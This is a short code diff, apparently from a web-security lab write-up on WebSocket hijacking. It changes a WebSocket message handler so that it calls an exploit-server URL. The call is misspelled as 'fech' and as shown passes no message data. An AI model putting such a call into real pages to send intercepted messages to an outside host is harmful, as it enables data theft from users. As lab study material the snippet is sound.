@@ -59,6 +59,6 @@ newWebSocket.onopen = function (evt) {
 
 newWebSocket.onmessage = function (evt) {
 	var message = evt.data;
-	fech("")
+	fech("https://exploit-0a130040047576bc80e70294011400d5.exploit-server.net/exploit")
 };
 ```
